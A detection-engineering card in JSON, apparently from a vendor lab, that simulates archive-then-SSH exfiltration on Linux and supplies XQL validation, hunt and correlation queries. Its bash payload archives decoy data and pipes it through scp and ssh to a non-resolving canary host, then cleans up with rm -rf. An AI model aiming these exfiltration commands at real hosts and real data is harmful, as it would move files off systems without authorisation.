@@ -1,0 +1,419 @@
+{
+  "id": "TTP-2026-0553",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-11-13T00:00:00+00:00",
+    "updated_at": "2026-11-13T00:00:00+00:00",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-edr",
+      "platform-linux",
+      "exfiltration",
+      "collection",
+      "archive",
+      "ssh",
+      "scp",
+      "no-egress",
+      "hunt-only-analytics-alert",
+      "severity-medium"
+    ],
+    "source_refs": [
+      "SRC-PANW-TECHDOCS",
+      "SRC-MITRE-ATTACK"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "requires_network_egress": false,
+      "requires_internet": false,
+      "platforms": [
+        "linux"
+      ],
+      "estimated_runtime_seconds": 180,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Linux Archive-Then-SSH Exfiltration Attempt — tar and gzip Archive Handed to scp and Piped to ssh (.invalid host, fails by design)",
+    "summary": "A root operator generates a decoy tree in a hidden /var/tmp directory, archives it with tar and gzip, then aims scp and a tar-to-ssh pipe at a host under .invalid. Both attempts fail at name resolution by design, so no data leaves the host. Scored: six XQL validations and one operator-installed correlation. The built-in SSH exfiltration alert is hunt content only.",
+    "description": "SOURCE. The Cortex analytics alert reference page for 'A compressed file was exfiltrated over SSH', as fetched on 2026-11-13. The page gives: activation period 14 Days, training period 30 Days, test period N/A (single event), deduplication period 1 Day, required data XDR Agent, severity Informational, ATT&CK TA0010 Exfiltration / T1048 Exfiltration Over Alternative Protocol, and the description 'Exfiltration of a compressed file over SSH.' It publishes no trigger predicate, threshold, field name, hash, domain, IP, URL or file name. Nothing on this card is a published indicator: every file, user and host name is a sandbox name chosen for SIM-EDR-027, and the card carries no IOC. No threat actor, campaign or malware family is named, because the page names none. WHAT SIM-EDR-027 DOES, for real, as root, inside the one directory /var/tmp/.cortexsim-sshexfil. step-01 generates about 5 MB of decoy data (24 CSV files from seq, 3 files of 1 MiB from /dev/urandom); no real user, credential or system file is read. step-02 archives the tree with tar -czf and compresses one collected file with gzip -9. step-03 runs scp with the archive path and a destination under .invalid. step-04 pipes a tar stream of the tree into ssh at the same host. step-05 deletes the archives, the staging tree and the sandbox. Steps are 40 s apart because back-to-back steps lost telemetry in this lab. THE TRANSFER FAILS BY DESIGN. A name under .invalid never resolves (RFC 6761), so no connection is opened, no SSH session exists and no byte of the archive leaves the host. The only network activity is the failed lookup of the name. step-03 and step-04 start the client only when a lookup of the name, bounded at 10 s, answers not found; they exit 3 without starting it if the name resolves or the lookup does not finish cleanly, and exit 4 unless the client then failed at name resolution. The destination is written with a trailing dot, which makes the name absolute so the resolver does not append a search domain to it. A connection attempt is bounded at 3 s (ConnectTimeout=3, one attempt); the name lookup, which no SSH option bounds, is bounded by ending the client after 10 s plus a 2 s kill grace. The SSH clients run with -F /dev/null, BatchMode, no known_hosts file, no identity file and no agent, so ~/.ssh is never read or written. SANDBOX OWNERSHIP. /var/tmp is world-writable, the sandbox name is predictable and every step runs as root. step-01 creates the sandbox root atomically (rm -rf, then mkdir -m 700 with no -p, which fails if anything is at the path), and step-02 to step-05 each stop before touching the sandbox unless ONE lstat of its root reports a directory, owned by the running user, mode 700. One lstat, so type, owner and mode come from the same inode; a test per property is one path lookup each, and a link swapped in between two of them can pass. The guard is a check of the path, so it holds where /var/tmp is sticky (mode 1777, as read back on the lab VM). Where /var/tmp is not sticky, another user can rename root's own directory after the check, and no check of the path stops that. WHAT IS DECLARED. Six XQL validation rows over xdr_data, one per real behaviour (two on the archive step), scored by Tier-2 verify only. One correlation, CR-EDR-0027, which fires only if the operator installs it first and is the only row its untagged alert can back. Its XQL has not been run in any tenant. WHAT IS HUNT ONLY. The built-in alert itself. It describes an exfiltration over SSH; this chain opens no SSH session, so the event the alert describes never occurs here, and the alert is Informational. WHAT HAS BEEN RUN. Only throwaway containers with no network. In the SimCore image, which has no OpenSSH client, the push bundle ran step-01, step-02 and step-05 and stopped step-03 and step-04 at their tool guard (exit 127). In a container that has OpenSSH 9.2, all five steps exited 0 and both clients failed at name resolution. In that container, with an unprivileged user racing mkdir and ln -s on the sandbox path in a sticky /var/tmp, step-01 ended either on a root-owned 0700 directory or with a non-zero exit in 300 of 300 runs (150 under dash, 150 under bash), and step-02 to step-05 refused every sandbox that user planted. With /var/tmp made non-sticky and that user swapping a directory and a link at the path, step-02 refused 900 of 900 runs under dash and 900 of 900 under bash; a three-test guard (-d, not -L, -O) let 1 of 300 past under dash and 18 of 300 under bash. In the same non-sticky setup, a swapper that renamed root's genuine sandbox away and back got root to write outside the sandbox in 42 of 150 runs under dash and 43 of 150 under bash, which is the limit stated above. A read-only probe on the lab endpoint (2026-11-13 23:47 UTC) found tar, gzip, timeout, getent and the OpenSSH 9.6p1 client present. The chain itself has not been run on the lab endpoint or against the tenant, and none of the telemetry described here has been observed.",
+    "severity": "medium",
+    "confidence": "medium"
+  },
+  "threat_context": {
+    "actors": [],
+    "campaigns": [],
+    "malware_families": []
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1048",
+        "name": "Exfiltration Over Alternative Protocol",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
+      },
+      {
+        "technique_id": "T1560",
+        "subtechnique_id": "T1560.001",
+        "name": "Archive Collected Data: Archive via Utility",
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ]
+      },
+      {
+        "technique_id": "T1074",
+        "subtechnique_id": "T1074.001",
+        "name": "Data Staged: Local Data Staging",
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.004",
+        "name": "Indicator Removal: File Deletion",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "Process: Process Creation",
+      "Command: Command Execution",
+      "File: File Creation",
+      "File: File Deletion"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "SIM-EDR-027 — archive-then-SSH-client exfiltration attempt at a .invalid host, delivered by the CortexSim beacon (or a push bundle) as root. The transfer fails by design.",
+    "privilege_required": "root",
+    "prerequisites": [
+      {
+        "description": "Cortex XDR agent on the Linux endpoint (lab: 9.4.0.470 on Ubuntu 24.04, report mode).",
+        "check_command": "test -x /opt/traps/bin/cytool && /opt/traps/bin/cytool runtime query | head -n 5"
+      },
+      {
+        "description": "tar, gzip, the OpenSSH client (ssh and scp), timeout (coreutils) and getent (libc-bin) on the endpoint. Read back from the lab VM on 2026-11-13 23:47 UTC by a read-only probe run on its beacon (pov-target-01): all of them are present, the OpenSSH client is 9.6p1, /var/tmp is not mounted noexec, the resolver is 127.0.0.53 with search \".\", and getent hosts on a .invalid name returned exit 2 at once. That probe read the endpoint; the chain itself has not been run there. A missing SSH client on a pull run does not read as a miss: step-03 declares requires_interpreters scp and ssh, and step-04 declares ssh, so the beacon looks each name up on the endpoint's PATH first, never runs the command if one is absent, and records the step not_run / TOOL_ABSENT. That step's rows and every later step's rows then read not_executed and leave the denominator. The cost: SimCore's advisory preflight knows only python, perl, ruby and node, so GET /api/agents/{id}/preflight and the run's runtime_dependency_gaps list ssh and scp as missing for every agent, including agents that have them. That listing is advisory and does not refuse the launch. When a tool really is absent, the step log says so itself, with the line `!! RUNTIME_DEPENDENCY_MISSING: scp` (or ssh). A push bundle ignores requires_interpreters, so each step also guards its own tools and exits 127 with 'command not found'; a pull run reaches that same guard if tar, gzip, timeout or getent is absent, and the rows of the step that stopped can then read missed or fail.",
+        "check_command": "for t in tar gzip ssh scp timeout getent; do command -v \"$t\" >/dev/null || echo \"missing: $t\"; done",
+        "remediation": "apt-get install -y openssh-client tar gzip coreutils"
+      },
+      {
+        "description": "The canary name must not resolve on the endpoint. A resolver that answers every name would give the SSH client a host to connect to. step-03 and step-04 therefore start the client only when a lookup of the name, bounded at 10 s, answers not found (getent exit 2). They exit 3 without starting the client if the name resolves, and also if the lookup does not finish cleanly (any other getent code; 124 means it was still running after 10 s), because an unfinished lookup is not proof the name is dead. They exit 4 if the client starts but does not fail at name resolution. Either exit is an endpoint condition: that step's rows are void, fix the resolver and re-run. The name is written with a trailing dot, which makes it absolute so the resolver does not append a search domain to it. On the lab VM the lookup of a .invalid name returned exit 2 at once (read-only probe, 2026-11-13 23:47 UTC).",
+        "check_command": "timeout 10 getent hosts ssh-drop.cortexsim-canary.invalid. >/dev/null; rc=$?; if [ \"$rc\" -eq 2 ]; then echo 'ok: the .invalid name is not found'; else echo \"do not run: getent exit $rc (0 = the name resolves; anything else = the lookup did not finish cleanly)\"; fi"
+      },
+      {
+        "description": "Correlation CR-EDR-0027 from this card installed in the tenant at Medium before the run. Without it the one alert-backed row cannot fire. Before installing it, run the rule's XQL once as an ordinary query in the tenant: its ordering stage has no tenant-tested precedent. If the tenant rejects the query, install the fallback XQL printed in the rule's note instead; the fallback has no order check.",
+        "check_command": "echo 'confirm in the tenant console: Detection Rules > Correlations'"
+      },
+      {
+        "description": "At least 75 minutes since the previous SIM-EDR-027 run was launched on the same endpoint, or CR-EDR-0027 disabled between runs. The rule looks back one hour on a 10-minute schedule, so for that long it can still raise an issue for the earlier run, and that issue would be credited to the new run by rule name.",
+        "check_command": "echo 'confirm the launch time of the last SIM-EDR-027 run on this endpoint is more than 75 minutes ago'"
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# NOT A SUBSTITUTE FOR THE SCENARIO: scenarios/edr/edr-027-compressed-archive-exfil-over-ssh.yml is the delivery path\n# (five steps, 40 s apart, with tool guards, a sandbox-ownership check before every later step, a fail-closed check\n# that the .invalid name does not resolve, and a check that each client failed at name resolution). This is the shape only.\nset -eu\nD=/var/tmp/.cortexsim-sshexfil\n# Atomic create: no -p on the root, so mkdir fails if anything is at the path after the remove.\nrm -rf \"$D\"; mkdir -m 700 \"$D\"; mkdir \"$D/stage\" \"$D/out\"\ndd if=/dev/urandom of=\"$D/stage/decoy.bin\" bs=1048576 count=1 status=none\ntar -czf \"$D/out/collect-stage.tar.gz\" -C \"$D\" stage\nO='-F /dev/null -o BatchMode=yes -o ConnectTimeout=3 -o ConnectionAttempts=1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o IdentitiesOnly=yes -o IdentityFile=/dev/null -o IdentityAgent=none'\n# Trailing dot: an absolute name, never extended with a search domain. ConnectTimeout=3 bounds a connection attempt;\n# timeout bounds the name lookup (10 s plus a 2 s kill grace).\ntimeout -k 2 10 scp $O \"$D/out/collect-stage.tar.gz\" cortexsim@ssh-drop.cortexsim-canary.invalid.:incoming/collect-stage.tar.gz < /dev/null || true\ntar -czf - -C \"$D\" stage | timeout -k 2 10 ssh $O -T cortexsim@ssh-drop.cortexsim-canary.invalid. 'cat > incoming/stage-stream.tar.gz' || true\nrm -rf \"$D\"",
+      "input_variables": [],
+      "timeout_seconds": 150
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "file",
+        "description": "step-01: 27 decoy files (about 5 MB) written under the staging directory by the step shell and by dd.",
+        "expected_value": "action_file_path contains \"/var/tmp/.cortexsim-sshexfil/stage/\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "step-02: tar started in create mode with the archive path under out/.",
+        "expected_value": "action_process_image_name = \"tar\" and action_process_image_command_line contains \"/var/tmp/.cortexsim-sshexfil/out/collect-stage.tar.gz\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "step-02: gzip started at level -9 on one collected file.",
+        "expected_value": "action_process_image_name = \"gzip\" and action_process_image_command_line contains \"/var/tmp/.cortexsim-sshexfil/out/ledger-all.csv\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "step-03: scp started with the archive path and the .invalid destination. scp spawns an ssh child whose command line carries the host but not the archive name.",
+        "expected_value": "action_process_image_name = \"scp\" and action_process_image_command_line contains \"cortexsim-canary.invalid\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "step-04: ssh started with the .invalid host and a remote command naming stage-stream.tar.gz, its input piped from tar -czf -.",
+        "expected_value": "action_process_image_name = \"ssh\" and action_process_image_command_line contains \"stage-stream.tar.gz\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "step-05: rm started with the archive path, then rm -rf on the staging tree and the sandbox root.",
+        "expected_value": "action_process_image_name = \"rm\" and action_process_image_command_line contains \"/var/tmp/.cortexsim-sshexfil/out/collect-stage.tar.gz\""
+      },
+      {
+        "artifact_type": "dns-query",
+        "description": "step-03 and step-04: a failed lookup of the canary name by getent and by ssh. No connection follows it. The chain asks for the name with a trailing dot; a recorded query name normally carries none, so match it with contains. Whether the agent records an event for a failed lookup has not been observed in this lab, and nothing is declared on it.",
+        "expected_value": "ssh-drop.cortexsim-canary.invalid"
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "# step-05 removes the sandbox itself. Run this by hand after a pull run in which an earlier step failed:\n# a pull run executes no cleanup, so the sandbox (about 8.5 MB) is then still on disk.\nrm -rf /var/tmp/.cortexsim-sshexfil"
+    }
+  },
+  "detections": {
+    "iocs": [],
+    "biocs": [],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "EDR-027 Decoy Tree Written Under Hidden Var Tmp Staging Directory",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter (event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE) and action_file_path contains \"/var/tmp/.cortexsim-sshexfil/stage/\") or (event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and action_process_image_name = \"dd\" and action_process_image_command_line contains \"/var/tmp/.cortexsim-sshexfil/stage/blobs/\")\n| fields _time, agent_hostname, actor_causality_id, actor_process_image_name, event_sub_type, action_file_path, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "EDR-027 Tar Creates Gzip Archive Of The Staging Tree",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"tar\" and action_process_image_command_line contains \"-czf\"\n| filter action_process_image_command_line contains \"/var/tmp/.cortexsim-sshexfil/out/collect-stage.tar.gz\"\n| fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "EDR-027 Gzip Compresses One Collected File",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"gzip\" and action_process_image_command_line contains \"-9\"\n| filter action_process_image_command_line contains \"/var/tmp/.cortexsim-sshexfil/out/ledger-all.csv\"\n| fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "EDR-027 Scp Started With The Archive And A Remote Destination",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"scp\" and action_process_image_command_line contains \"/var/tmp/.cortexsim-sshexfil/out/collect-stage.tar.gz\"\n| filter action_process_image_command_line contains \"cortexsim-canary.invalid\"\n| fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "EDR-027 Ssh Started With A Remote Archive Write Fed By A Tar Pipe",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"ssh\" and action_process_image_command_line contains \"cortexsim-canary.invalid\"\n| filter action_process_image_command_line contains \"stage-stream.tar.gz\"\n| fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "EDR-027 Rm Deletes The Archive After The Attempt",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"rm\" and action_process_image_command_line contains \"/var/tmp/.cortexsim-sshexfil/out/collect-stage.tar.gz\"\n| fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "hunt",
+        "name": "EDR-027 Hunt — SSH Client Starts That Name A Compressed Archive, Per Host (any Linux endpoint; this chain yields scp and ssh rows)",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 604800\n| filter agent_os_type = ENUM.AGENT_OS_LINUX\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in (\"scp\", \"sftp\", \"ssh\")\n| filter action_process_image_command_line ~= \"[.](tar[.]gz|tgz|tar[.]bz2|tbz2|tar[.]xz|txz|tar[.]zst|zip|7z|gz)([^A-Za-z0-9]|$)\"\n| comp count() as starts, min(_time) as first_seen, max(_time) as last_seen by agent_hostname, action_process_image_name\n| sort desc starts",
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "hunt",
+        "name": "EDR-027 Hunt — SSH Client Network Rows On Port 22 (the leg a real transfer adds; this chain produces no row by design)",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 604800\n| filter agent_os_type = ENUM.AGENT_OS_LINUX\n| filter event_type = ENUM.NETWORK\n| filter actor_process_image_name in (\"ssh\", \"scp\", \"sftp\") and action_remote_port = 22\n| fields _time, agent_hostname, actor_causality_id, actor_process_image_name, actor_process_command_line, action_remote_ip, action_remote_port",
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "investigation",
+        "name": "EDR-027 Chain Read-Back — Every Process Start That Names The Sandbox Or The Canary Host, In Order",
+        "query": "dataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 3600\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_command_line contains \"/var/tmp/.cortexsim-sshexfil\" or action_process_image_command_line contains \"cortexsim-canary.invalid\"\n| fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort asc _time",
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "EDR-027 Scratch Tarball Followed By SSH Carrier",
+        "rule_id": "CR-EDR-0027",
+        "logic": "Operator-installed correlation rule (CortexSim never writes it to the tenant). Alert name EXACTLY as this rule's name; severity Medium (only Medium or higher opens or joins a case); Scheduled, every 10 minutes, query time frame 1 hour; alert field mapping: agent_hostname -> Host Name, agent_id -> Agent ID (the mapping CR-EDR-0023 uses); NO MITRE tag (the issue is matched by its name; a tagged issue would also be credited to the validation rows of every step that shares the technique, because a saved XQL and a correlation are one engine family to the matcher). UNTESTED: this XQL has not been run in any tenant. Its alter, comp, then filter shape follows CR-EDR-0023 on TTP-2026-0198, which that card records as tested read-only in the lab tenant on 2026-11-11. The ordering stage (the second alter, max() over a timestamp made by if(leg = ..., _time, null), and the two timestamp_diff conditions) is new here and has no tenant-tested precedent, and this rule is the scenario's only alert-backed row. BEFORE INSTALLING: run the XQL below once as an ordinary query in the tenant. If the tenant accepts it, install it as written. If the tenant rejects it, install the FALLBACK XQL printed after it instead. The fallback keeps the two legs, takes the comp and the final filter of CR-EDR-0023, and drops the ordering stage. It therefore has NO ORDER CHECK: it fires when both legs are present on one agent inside the time frame, in either order and any distance apart. It still fires on this chain. NO _time COLUMN, ON PURPOSE: neither query returns _time. The engine credits an alert to a run only if the alert is dated at or after the launch, and it dates an issue by detection_timestamp, then creation_time, then local_insert_ts, then _insert_time. A _time column in a rule's output could date the issue by an event instead of by the rule's own run, so none is returned. Which of those fields a correlation issue carries, and what they hold, has not been seen in this lab: the first lab run should record the timestamp fields of the CR-EDR-0027 issue. The rule is built only from process starts SIM-EDR-027 produces on one host: step-02 starts tar with an archive path under /var/tmp (the archived leg), and step-03 and step-04 start scp and ssh with a compressed-archive name on the command line (the carried leg). As written it fires when the latest SSH-client start is at or after the latest archiver start and no more than 900 seconds after it. It needs no connection, so it fires on an attempt as well as on a transfer, which is why this chain can raise it. It matches list and extract runs of an archiver as well as create runs. While the events stay inside the one-hour time frame it fires again on every scheduled run; alert suppression is the operator's choice. There is no current_time in the rule: the time frame bounds it. XQL:\ndataset = xdr_data\n| filter agent_os_type = ENUM.AGENT_OS_LINUX\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| alter leg = if(action_process_image_name in (\"tar\", \"zip\", \"7z\", \"7za\") and action_process_image_command_line ~= \"(/tmp/|/var/tmp/|/dev/shm/)[^ ]*[.](tar[.]gz|tgz|tar[.]bz2|tbz2|tar[.]xz|txz|tar[.]zst|zip|7z)([^A-Za-z0-9]|$)\", \"archived\", if(action_process_image_name in (\"scp\", \"sftp\", \"ssh\") and action_process_image_command_line ~= \"[.](tar[.]gz|tgz|tar[.]bz2|tbz2|tar[.]xz|txz|tar[.]zst|zip|7z)([^A-Za-z0-9]|$)\", \"carried\", \"other\"))\n| filter leg in (\"archived\", \"carried\")\n| alter archived_at = if(leg = \"archived\", _time, null), carried_at = if(leg = \"carried\", _time, null)\n| comp count_distinct(leg) as legs, count() as events, max(archived_at) as last_archived, max(carried_at) as last_carried by agent_hostname, agent_id\n| filter legs >= 2 and timestamp_diff(last_carried, last_archived, \"SECOND\") >= 0 and timestamp_diff(last_carried, last_archived, \"SECOND\") <= 900\nFALLBACK XQL (no order check; install it only if the tenant rejects the query above):\ndataset = xdr_data\n| filter agent_os_type = ENUM.AGENT_OS_LINUX\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| alter leg = if(action_process_image_name in (\"tar\", \"zip\", \"7z\", \"7za\") and action_process_image_command_line ~= \"(/tmp/|/var/tmp/|/dev/shm/)[^ ]*[.](tar[.]gz|tgz|tar[.]bz2|tbz2|tar[.]xz|txz|tar[.]zst|zip|7z)([^A-Za-z0-9]|$)\", \"archived\", if(action_process_image_name in (\"scp\", \"sftp\", \"ssh\") and action_process_image_command_line ~= \"[.](tar[.]gz|tgz|tar[.]bz2|tbz2|tar[.]xz|txz|tar[.]zst|zip|7z)([^A-Za-z0-9]|$)\", \"carried\", \"other\"))\n| filter leg in (\"archived\", \"carried\")\n| comp count_distinct(leg) as legs, count() as events, min(_time) as first_seen, max(_time) as last_seen by agent_hostname, agent_id\n| filter legs >= 2"
+      }
+    ],
+    "analytics_modules": [
+      {
+        "module": "A compressed file was exfiltrated over SSH",
+        "validated": false,
+        "note": "Hunt only; SIM-EDR-027 does not declare it. Built-in Cortex analytics alert. Reference page as fetched on 2026-11-13: activation period 14 Days, training period 30 Days, test period N/A (single event), deduplication period 1 Day, required data XDR Agent, severity Informational, ATT&CK TA0010 Exfiltration / T1048 Exfiltration Over Alternative Protocol, description 'Exfiltration of a compressed file over SSH.' The page publishes no trigger predicate, threshold, field name or indicator. Why it is not scored: by the no-egress rule of this build the chain's SSH destination is a name under .invalid, which never resolves, so no SSH session is opened and the event the alert describes never occurs. The alert is also Informational, which never creates or joins a case. It has not been observed in this lab. In a tenant where a real SSH transfer of an archive happens, use the two hunt queries on this card."
+      }
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "xql-validation",
+        "coverage_tier": "investigation",
+        "license_required": "pro",
+        "evidence_query": "The six validation queries on this card, over xdr_data process and file events from the endpoint. Tier-2 verify only; none raises an issue and none raises Detection Accuracy."
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "correlation",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-CR-EDR-0027"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "Issue 'EDR-027 Scratch Tarball Followed By SSH Carrier' (operator-installed correlation, Medium) on the endpoint. The only alert-backed row of SIM-EDR-027. Only Medium-or-higher issues create or join a case, so it is expected to open a case of its own; it is the only Medium-or-higher issue this chain can raise. No correlation issue has been observed in this lab."
+      },
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics-bioc",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "A compressed file was exfiltrated over SSH"
+        ],
+        "license_required": "pro",
+        "evidence_query": "// HUNT ONLY. Not scored by SIM-EDR-027 and not satisfied by its telemetry: this chain opens no SSH session.\n// This is not the built-in alert's logic, which its reference page does not publish. It lists SSH-client network rows on port 22.\n// The network field names (action_remote_ip, action_remote_port, actor_process_command_line) follow this corpus's convention and have not been checked against Linux agent network rows in this lab.\ndataset = xdr_data\n| filter timestamp_diff(current_time(), _time, \"SECOND\") < 604800\n| filter agent_os_type = ENUM.AGENT_OS_LINUX\n| filter event_type = ENUM.NETWORK\n| filter actor_process_image_name in (\"ssh\", \"scp\", \"sftp\") and action_remote_port = 22\n| fields _time, agent_hostname, actor_causality_id, actor_process_image_name, actor_process_command_line, action_remote_ip, action_remote_port"
+      }
+    ],
+    "threat_scenarios": [
+      {
+        "threat_scenario_id": "TS-EDR-027",
+        "name": "Archive Then SSH Client: an Exfiltration Attempt That Fails By Design",
+        "description": "Generate decoy data, archive it with stock tools, aim scp and a tar-to-ssh pipe at a host that cannot resolve, and remove the archive. Check two things: every real behaviour is queryable as a process start on the endpoint, and an operator-installed correlation ties the archiver to the SSH client in one issue.",
+        "threat_steps": [
+          {
+            "threat_step_id": "TS-EDR-027A",
+            "objective": "Collection and archiving are queryable as process starts on the endpoint.",
+            "preconditions": [
+              "Linux endpoint with the Cortex agent; tar and gzip present."
+            ],
+            "steps": [
+              "Generate the decoy tree under the hidden staging directory (step-01).",
+              "Archive it with tar -czf and compress one collected file with gzip -9 (step-02)."
+            ],
+            "success_criteria": [
+              "XQL `EDR-027 Decoy Tree Written Under Hidden Var Tmp Staging Directory` returns a row.",
+              "XQL `EDR-027 Tar Creates Gzip Archive Of The Staging Tree` returns a row.",
+              "XQL `EDR-027 Gzip Compresses One Collected File` returns a row.",
+              "These rows are scored by Tier-2 verify only and never raise Detection Accuracy."
+            ],
+            "expected_score_weight": 0.3
+          },
+          {
+            "threat_step_id": "TS-EDR-027B",
+            "objective": "Both SSH-client attempts are queryable with the archive named on the command line, and neither opens a session.",
+            "preconditions": [
+              "The OpenSSH client present; the canary name under .invalid does not resolve on the endpoint."
+            ],
+            "steps": [
+              "Run scp with the archive and the .invalid destination (step-03).",
+              "Pipe a tar stream of the tree into ssh at the same host (step-04)."
+            ],
+            "success_criteria": [
+              "XQL `EDR-027 Scp Started With The Archive And A Remote Destination` returns a row.",
+              "XQL `EDR-027 Ssh Started With A Remote Archive Write Fed By A Tar Pipe` returns a row.",
+              "Each step's output shows the client failed at name resolution: no connection, no session, no data off the host.",
+              "Not a criterion: the built-in alert `A compressed file was exfiltrated over SSH`. No SSH session exists for it to describe."
+            ],
+            "expected_score_weight": 0.4
+          },
+          {
+            "threat_step_id": "TS-EDR-027C",
+            "objective": "The archive is removed, and the correlation ties the archiver and the SSH client into one issue.",
+            "preconditions": [
+              "CR-EDR-0027 installed at Medium, scheduled every 10 minutes over a 1 hour time frame, with no MITRE tag."
+            ],
+            "steps": [
+              "Delete the archives, the staging tree and the sandbox (step-05).",
+              "Wait for the rule's next scheduled run."
+            ],
+            "success_criteria": [
+              "XQL `EDR-027 Rm Deletes The Archive After The Attempt` returns a row.",
+              "Issue `EDR-027 Scratch Tarball Followed By SSH Carrier` (Medium) from CR-EDR-0027 on the endpoint: alert-backed, and only if the operator installed the rule.",
+              "Nothing is left under /var/tmp/.cortexsim-sshexfil."
+            ],
+            "expected_score_weight": 0.3
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Limit outbound SSH from servers to the destinations that need it. An archive cannot leave over SSH to a host the server cannot reach.",
+      "Give backup and deployment jobs their own service account and a fixed destination, so an SSH copy of an archive by any other account or to any other host stands out.",
+      "Watch world-writable scratch directories (/tmp, /var/tmp, /dev/shm) on servers that produce no backups: an archive appearing there is the step before the copy."
+    ],
+    "detection_engineering": [
+      "Key the SSH-client leg on the image names scp, sftp and ssh and on an archive extension in the command line. In a no-network container (OpenSSH 9.2), this chain's scp line handed its ssh child the arguments `... -l cortexsim -s -- ssh-drop.cortexsim-canary.invalid. sftp`: the host is on the child's command line and the archive name is not, so the archive name is on the scp process only. Not checked on the lab endpoint's OpenSSH.",
